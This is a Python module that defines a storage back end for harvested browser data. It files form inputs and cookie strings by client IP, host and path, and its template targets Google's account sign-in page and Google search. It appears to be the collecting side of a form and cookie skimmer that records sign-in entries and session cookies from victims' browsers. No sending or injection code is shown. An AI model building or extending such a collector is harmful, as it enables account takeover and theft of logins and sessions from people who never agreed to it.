from typing import Any, Dict, List, Tuple, TypedDict
from urllib.parse import urlparse

class ScrapeTypeEnum:
    INPUTS = "inputs"
    COOKIES = "cookies"

class AttributeType(TypedDict):
    name: str
    value: str

class ElementType(TypedDict):
    tag: str
    attributes: List[AttributeType]
    value: str

class DataCollectionType(TypedDict):
    inputs: List[Tuple[int, str, List[ElementType]]]
    cookies: List[Tuple[int, str, str]]
    href: List[Tuple[int, str]]

def newDataCollectionType() -> DataCollectionType:
    return DataCollectionType(inputs=[], cookies=[], href=[])

StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]

template: StorageDataType = {
    "127.0.0.1": {
        "www.google.com": {
            "/search": {
                ScrapeTypeEnum.INPUTS: [

                ],
                ScrapeTypeEnum.COOKIES: [

                ],
                "href": []
            },
        },
        "accounts.google.com": {
            "/signin/v2/identifier": {
                ScrapeTypeEnum.INPUTS: [
                    # list of (time, href, data)
                ],
                ScrapeTypeEnum.COOKIES: [
                    # list of (time, href, cookie)
                ],
                "href": []
            },
        }
    },
}

class Storage:
    def __init__(self) -> None:
        self.__data: StorageDataType = {}

    def to_json(self) -> StorageDataType:
        return self.__data

    def save(self) -> None:
        pass

    def store(self, ip: str, data: Dict[str, Any]) -> None:
        # store a request data into the storage
        if ip not in self.__data:
            self.__data[ip] = {}
        
        # create a new entry for this host and path
        url = urlparse(data["href"])
        if url.netloc not in self.__data[ip]:
            self.__data[ip][url.netloc] = {}
        if url.path not in self.__data[ip][url.netloc]:
            self.__data[ip][url.netloc][url.path] = newDataCollectionType()

        # check the type
        if data["type"] == ScrapeTypeEnum.INPUTS:
            for element in data["data"]:
                self.__data[ip][url.netloc][url.path]["inputs"].append((
                    data["time"],
                    data["href"],
                    element,
                ))
        elif data["type"] == ScrapeTypeEnum.COOKIES:
            for cookie in data["data"][0].split(";"):
                self.__data[ip][url.netloc][url.path]["cookies"].append((
                    data["time"],
                    data["href"],
                    cookie,
                ))
            self.__data[ip][url.netloc][url.path]["href"].append((
                data["time"],
                data["href"],
            ))
